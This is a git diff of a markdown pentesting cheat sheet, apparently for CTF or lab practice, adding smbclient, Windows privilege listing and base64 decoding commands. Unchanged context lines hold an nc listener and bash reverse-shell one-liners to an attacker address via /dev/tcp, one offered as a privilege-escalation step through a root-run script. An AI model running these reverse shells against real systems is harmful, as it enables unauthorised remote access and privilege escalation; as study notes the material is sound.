@@ -117,10 +117,24 @@ find / -perm /4000
 ```
 sudo -l
 ```
+
 - Open and listen on a port using `nc`. Now you're ready to execute that reverse shell.
 ```
 nc -lvp [port_number]
 ```
+
+- Connect to Samba share using `smbclient`:
+```
+smbclient \\\\[ip]\\[share]
+```
+
+
+## Basic Windows Commmands
+- List user with privileges
+```
+whoami /priv
+```
+
 
 
 ## Random Tips & Tricks
@@ -154,4 +168,9 @@ bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
 > If there's a script that is executed by root, modifing the script file may be a privileg escalation vector:
 ```
 bash -i >& /dev/tcp/[attack_ip]/[attack_port] 0>&1; 
+```
+
+### Decode Base64
+```
+ echo [base64_string] | base64 -d
 ```
